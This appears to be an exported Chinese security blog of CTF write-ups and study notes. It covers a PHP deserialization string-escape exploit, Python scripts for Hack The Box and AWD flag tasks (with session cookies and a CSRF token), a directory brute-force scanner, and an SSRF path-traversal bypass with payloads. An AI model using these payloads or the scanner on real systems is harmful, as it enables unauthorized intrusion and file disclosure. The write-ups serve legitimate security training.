<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * @Created by PhpStorm_培训</span><br><span class="line"> * @Author: shmily-ing</span><br><span class="line"> * @Data: 2022&#x2F;5&#x2F;8 15:51</span><br><span class="line"> *&#x2F;</span><br><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">    public $u;</span><br><span class="line">    public $uname;</span><br><span class="line">    public $password;</span><br><span class="line">    public function __construct($u,$uname,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;u &#x3D; $u;</span><br><span class="line">        $this-&gt;uname&#x3D;$uname;</span><br><span class="line">        $this-&gt;password&#x3D;$password;</span><br><span class="line">    &#125;</span><br><span class="line">&#x2F;&#x2F;    public function __wakeup()</span><br><span class="line">&#x2F;&#x2F;    &#123;</span><br><span class="line">&#x2F;&#x2F;        if($this-&gt;password&#x3D;&#x3D;&#x3D;&#39;easy&#39;)</span><br><span class="line">&#x2F;&#x2F;        &#123;</span><br><span class="line">&#x2F;&#x2F;            include(&#39;flag.php&#39;);</span><br><span class="line">&#x2F;&#x2F;            echo $flag;</span><br><span class="line">&#x2F;&#x2F;        &#125;</span><br><span class="line">&#x2F;&#x2F;        else</span><br><span class="line">&#x2F;&#x2F;        &#123;</span><br><span class="line">&#x2F;&#x2F;            echo &#39;wrong password&#39;;</span><br><span class="line">&#x2F;&#x2F;        &#125;</span><br><span class="line">&#x2F;&#x2F;    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#39;challenge&#39;,&#39;&#39;,$string);</span><br><span class="line">&#125;</span><br><span class="line">$u&#x3D;&#39;xxxxx&#39;;</span><br><span class="line">$uname &#x3D; &#39;xxxxx&#39;;</span><br><span class="line">$password &#x3D; &#39;1&#39;;</span><br><span class="line">$s &#x3D; new a($u,$uname,$password);</span><br><span class="line">var_dump($s);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($s));</span><br><span class="line"></span><br><span class="line">var_dump(filter(serialize($s)));</span><br><span class="line"></span><br><span class="line">var_dump(unserialize(filter(serialize($s))))</span><br></pre></td></tr></table></figure>



<ol>
<li>我们要构造<code>&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code>才能达到目的</li>
<li>challenge会被置空，会导致<code>&quot;;s:5:&quot;uname&quot;;s:59:&quot;aaaaaaa</code>成为自己的值，所以还需要构造<code>;s:5:&quot;uname&quot;;s:4:&quot;test&quot;</code>  uname的值是能够真正传进去的值</li>
</ol>
<p><img src="/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220515162549559.png" alt="image-20220515162549559"></p>
<p>所以$uname 需要构造成<code>&quot;;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code>一共52个字符</p>
<p>但是这样肯定是不行,结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object(a)#1 (3) &#123;</span><br><span class="line">  [&quot;u&quot;]&#x3D;&gt;</span><br><span class="line">  string(27) &quot;challengechallengechallenge&quot;</span><br><span class="line">  [&quot;uname&quot;]&#x3D;&gt;</span><br><span class="line">  string(52) &quot;&quot;;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&quot;</span><br><span class="line">  [&quot;password&quot;]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">&#125;</span><br><span class="line">string(150) &quot;O:1:&quot;a&quot;:3:&#123;s:1:&quot;u&quot;;s:27:&quot;challengechallengechallenge&quot;;s:5:&quot;uname&quot;;s:52:&quot;&quot;;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&quot;</span><br><span class="line">string(123) &quot;O:1:&quot;a&quot;:3:&#123;s:1:&quot;u&quot;;s:27:&quot;&quot;;s:5:&quot;uname&quot;;s:52:&quot;&quot;;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&quot;</span><br><span class="line">bool(false)</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第二个是过滤后序列化结果，$u 传入3个challenge长度为27，因为filter函数将challenge变为空，导致$u结果成为：<code>&quot;;s:5:&quot;uname&quot;;s:52:&quot;</code> 只有20个字符长度，</p>
<p>所以$uname需要随机多加7个字符填充</p>
<p> 即：<code>xxxxxxx&quot;;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code></p>
<p>调试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Created</span> by PhpStorm_培训</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: shmily-ing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Data</span>: 2022/5/8 15:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $u;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$u,$uname,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;u = $u;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    public function __wakeup()</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        if($this-&gt;password===&#x27;easy&#x27;)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            include(&#x27;flag.php&#x27;);</span></span><br><span class="line"><span class="comment">//            echo $flag;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        else</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            echo &#x27;wrong password&#x27;;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;challenge&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$u=<span class="string">&#x27;challengechallengechallenge&#x27;</span>;</span><br><span class="line">$uname = <span class="string">&#x27;xxxxxxx&quot;;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&#x27;</span>;</span><br><span class="line">$password = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">$s = <span class="keyword">new</span> a($u,$uname,$password);</span><br><span class="line">var_dump($s);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($s));</span><br><span class="line"></span><br><span class="line">var_dump(filter(serialize($s)));</span><br><span class="line"></span><br><span class="line">var_dump(unserialize(filter(serialize($s))))</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220515164805871.png" alt="image-20220515164805871"></p>
<p>发送请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:20001&#x2F;5.php&#x2F;?u&#x3D;challengechallengechallenge&amp;uname&#x3D;aaaaaaa&quot;;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220515161717719.png" alt="image-20220515161717719"></p>
<p>参考：</p>
<p><a href="https://blog.csdn.net/m0_57497184/article/details/123490870">https://blog.csdn.net/m0_57497184/article/details/123490870</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1627299">https://cloud.tencent.com/developer/article/1627299</a></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>python-study</title>
    <url>/2021/01/10/python-study/</url>
    <content><![CDATA[<h2 id="0x01-MD5-encrypt-this-string"><a href="#0x01-MD5-encrypt-this-string" class="headerlink" title="0x01 MD5 encrypt this string"></a>0x01 MD5 encrypt this string</h2><p><img src="/2021/01/10/python-study/1.png" alt="image-20210129112157855"></p>
<p>提取字符串，进行md5加密，并提交。我还是太慢了，学学脚本。网络有点卡多提交几次</p>
<p>from hack the box web1</p>
<p>自己结合网上的学习了两种方法，re.search和re.findall，个人感觉还是比较喜欢第二种方法，感觉法二挺方便的</p>
<a id="more"></a>

<ul>
<li>法一</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re              <span class="comment">#字符串匹配</span></span><br><span class="line"></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://159.65.87.50:32588/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=1nd51s259e9epagvhkgolgm5h7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://159.65.87.50:32588&quot;</span>&#125;</span><br><span class="line">url1 = <span class="string">&quot;http://159.65.87.50:32588/&quot;</span></span><br><span class="line">req1 = requests.get(url=url1,headers=head)</span><br><span class="line">str1= re.search(<span class="string">&quot;&lt;h3 align=&#x27;center&#x27;&gt;(.)*&lt;/h3&gt;&quot;</span>,req1.text)</span><br><span class="line">str2=str1.group(<span class="number">0</span>).replace(<span class="string">&quot;&lt;h3 align=&#x27;center&#x27;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&lt;/h3&gt;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print (str2)</span></span><br><span class="line">h1=hashlib.md5()</span><br><span class="line">h1.update(str2.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">md5 =h1.hexdigest()</span><br><span class="line"><span class="comment">#print(md5)</span></span><br><span class="line">postdata=<span class="string">&quot;hash=&quot;</span>+md5</span><br><span class="line"></span><br><span class="line">req2=requests.post(data=postdata,url=url1,headers=head)</span><br><span class="line">print(req2.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>法二</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-   </span></span><br><span class="line"><span class="comment"># hack the box web1 re.findall</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_str</span>(<span class="params">str</span>):</span></span><br><span class="line">    md=hashlib.md5();</span><br><span class="line">    md.update(str.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> md.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://138.68.182.108:31255/&quot;</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=3brhsrsfuq7k869bg9s7bae6u4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://138.68.182.108:31255&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req1 = requests.get(url,headers=head)</span><br><span class="line">str = re.findall(<span class="string">r&#x27;&lt;h3 align=.*&gt;(.*?)&lt;/h3&gt;&#x27;</span>,req1.text,re.S)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#print(str)</span></span><br><span class="line">mdstr=md5_str(str)</span><br><span class="line"><span class="comment">#print(mdstr)</span></span><br><span class="line">req2=requests.post(url,headers=head,data=<span class="string">&quot;hash=&quot;</span>+mdstr)</span><br><span class="line"><span class="comment">#print(req2.text)</span></span><br><span class="line">flag=<span class="string">&quot;HTB&#123;&quot;</span>+re.findall(<span class="string">&#x27;HTB\&#123;(.*?)\&#125;&#x27;</span>,req2.text,re.S)[<span class="number">0</span>]+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/01/10/python-study/1.1.png" alt="1.1"></p>
<h2 id="0x02-scan-dir目录扫描"><a href="#0x02-scan-dir目录扫描" class="headerlink" title="0x02 scan_dir目录扫描"></a>0x02 scan_dir目录扫描</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0&#x27;</span>&#125;</span><br><span class="line">url = sys.argv[<span class="number">1</span>]   </span><br><span class="line">zidian = sys.argv[<span class="number">2</span>]</span><br><span class="line">result = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(zidian,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line = line.strip()</span><br><span class="line">        r =requests.get(url+line,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">&quot;url:&quot;</span>+r.url+<span class="string">&quot;\n   exist&quot;</span>)</span><br><span class="line">            <span class="keyword">with</span> open(result,<span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">                f1.write(<span class="string">&quot;url:&quot;</span>+r.url+<span class="string">&quot;    exist\n&quot;</span>)    //写入result.txt</span><br><span class="line">        <span class="keyword">else</span>:print(<span class="string">&quot;url:&quot;</span>+r.url +<span class="string">&quot;\n   false&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>python  scan_dir.py  <a href="http://www.shmilying.top/">http://www.shmilying.top/</a>  F:\pycharm\python-study\zidian.txt   F:\pycharm\python-study\result.txt</p>
<p>result:</p>
<p><img src="/2021/01/10/python-study/2.0.png" alt="2.0"></p>
<p><img src="/2021/01/10/python-study/2.1.png" alt="2.1"></p>
<h2 id="0x03-file-open-r-w-a"><a href="#0x03-file-open-r-w-a" class="headerlink" title="0x03 file_open_r/w/a"></a>0x03 file_open_r/w/a</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">***read***</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;zidian.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> f():</span><br><span class="line">        print(a.strip())       <span class="comment">#最实用,方便，而且效果和下面的一样。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        print(line.strip())     <span class="comment">#比较方便</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():  <span class="comment">#读取全部  == for line in f：</span></span><br><span class="line">    print(line)</span><br><span class="line">    print(line.strip())  <span class="comment">#去除空行</span></span><br><span class="line">f.close()                 <span class="comment">#记得关闭</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">line1 = f.readline()        <span class="comment">#读一行</span></span><br><span class="line">print(line1)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">line2 = f.read(<span class="number">1</span>)           <span class="comment">#读字节</span></span><br><span class="line">print(line2)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">***write***</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)          <span class="comment">#open(&quot;zidian.txt&quot;,&quot;a&quot;) 在末尾追加,不影响原来的</span></span><br><span class="line">f.write(<span class="string">&#x27;\nxxxxx&#x27;</span>)                  <span class="comment">#open(&quot;zidian.txt&quot;,&quot;w&quot;) w:写入内容会覆盖原有内容</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f2 = open(<span class="string">&quot;zidian.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f2.readlines():</span><br><span class="line">    print(line.strip())</span><br><span class="line">f2.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>总结：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">&quot;c:\filename&quot;</span>,<span class="string">&quot;mode&quot;</span>)   //mode:r/w/a</span><br><span class="line">xxxxxxx</span><br><span class="line">xxxxxxx</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h2 id="0x04-awd-sendflag"><a href="#0x04-awd-sendflag" class="headerlink" title="0x04 awd_sendflag"></a>0x04 awd_sendflag</h2><p>学习的大佬脚本，批量sendflag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span>-<span class="title">flag</span>(<span class="params">flag</span>):</span>      //自定义函数</span><br><span class="line"></span><br><span class="line">    url=<span class="string">&quot;http://xx.xxx.xxx.xx:8080/api/v1/challenges/attempt&quot;</span></span><br><span class="line">    <span class="comment">#data=&#123;&quot;challenge_id&quot;:2,&quot;submission&quot;:&quot;&quot;+flag+&quot;&quot;&#125;</span></span><br><span class="line">    data=<span class="string">&#x27;&#123;&quot;challenge_id&quot;:2,&quot;submission&quot;:&quot;&#x27;</span>+flag+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">    h = &#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;CSRF-Token&quot;</span>:<span class="string">&quot;e9817606c5e5373499bd7e43b64c045b60a276b839b340c4f4a37c2eb27f4e8a&quot;</span>,</span><br><span class="line"><span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line"><span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">    cookies=&#123;<span class="string">&quot;session&quot;</span>:<span class="string">&quot;2deefa03-cda6-41fc-be25-a986067c7048&quot;</span>,<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;jnr3quolg5o2ohlifbdld6bku5&quot;</span>&#125;</span><br><span class="line">    req=requests.post(url=url,data=data,cookies=cookies,headers=h)</span><br><span class="line">    print(req.text)        //result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flagtxt</span>():</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;web1-flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> f:</span><br><span class="line">            print(a.strip())</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            result-flag(a.strip())</span><br><span class="line">            </span><br><span class="line">flagtxt()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="0x05-生成以指定字符为开头的md5值"><a href="#0x05-生成以指定字符为开头的md5值" class="headerlink" title="0x05 生成以指定字符为开头的md5值"></a>0x05 生成以指定字符为开头的md5值</h2><ul>
<li>百度的</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 脚本功能：生成以指定字符为开头的md5值（x位数字）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryption</span>(<span class="params">chars</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(chars.encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    <span class="keyword">return</span> str(random.randint(<span class="number">11111111</span>,<span class="number">99999999</span>))  <span class="comment">#爆破范围</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    start = <span class="string">&quot;66666&quot;</span>  <span class="comment">#md5指定前几位</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        strs = generate()</span><br><span class="line">        print(<span class="string">&quot;Test %s &quot;</span> % strs)</span><br><span class="line">        <span class="keyword">if</span> encryption(strs).startswith(start):</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">&quot;yes!&quot;</span>)</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">&quot;[+] %s &quot;</span> % strs + <span class="string">&quot;%s &quot;</span> % encryption(strs))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">&quot;no!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&#x27;完成！&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yes!</span><br><span class="line">[+] 43650254 66666b9c81d0d15f983ad8963908ce10 </span><br><span class="line">完成！</span><br></pre></td></tr></table></figure>



<h2 id="0x06-多线程"><a href="#0x06-多线程" class="headerlink" title="0x06 多线程"></a>0x06 多线程</h2><ul>
<li>1</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">name</span>):</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">&#x27;%s say hello&#x27;</span> %name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t=Thread(target=test,args=(<span class="string">&#x27;egon&#x27;</span>,))</span><br><span class="line">    t.start()</span><br><span class="line">    print(<span class="string">&#x27;主线程&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>2</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>(<span class="params">Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name</span>):</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        print(<span class="string">&quot;%s good night&quot;</span> %self.name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t = test(<span class="string">&#x27;lihua&#x27;</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    print(<span class="string">&quot;zhuxiancheng&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="0x07-proxy"><a href="#0x07-proxy" class="headerlink" title="0x07 proxy"></a>0x07 proxy</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;https://home.firefoxchina.cn/&quot;</span></span><br><span class="line">proxies= &#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,<span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;https://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">r=requests.get(url,proxies=proxies,verify=<span class="literal">False</span>)  <span class="comment">###verify 避免证书检测</span></span><br><span class="line">print(r.status_code)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>白帽python</tag>
      </tags>
  </entry>
  <entry>
    <title>unctf2020</title>
    <url>/2020/11/15/unctf/</url>
    <content><![CDATA[<h2 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">                   welc0me to <span class="number">2020</span>UNCTF!!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/unctf\.com/&#x27;</span>,$url))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;</span>,$url))&#123;</span><br><span class="line">        $url=file_get_contents($url);</span><br><span class="line">        <span class="keyword">echo</span>($url);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;error!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>第一需要匹配unctf.com,第二不能匹配php|file|zip|bzip|zlib|base|data。</p>
<p>url可控，可以访问unctf.com里面的数据 从而造成ssrf。</p>
<a id="more"></a>

<hr>
<blockquote>
<p>?url=<a href="http://www.unctf.com/flag">www.unctf.com/../../../../../flag</a></p>
</blockquote>
<p><img src="/2020/11/15/unctf/1.png" alt="1"></p>
<hr>
<hr>
<p>payload2:</p>
<p><code>file_get_contents()</code>函数如果输入一个不存在的协议名，</p>
<p>例如构造<code>aaa://</code>,其中<code>aaa:/</code>会被识别成一个目录,<code>/unctf.com</code>是另一个目录,</p>
<p>后端就会读取成<code>/aaa:/unctf.com/../../../../../flag</code>就会造成目录穿越，从而造成SSRF。</p>
<blockquote>
<p>?url=aaa://unctf.com/../../../../../../flag</p>
</blockquote>
<p><img src="/2020/11/15/unctf/2.png" alt="2"></p>
<hr>
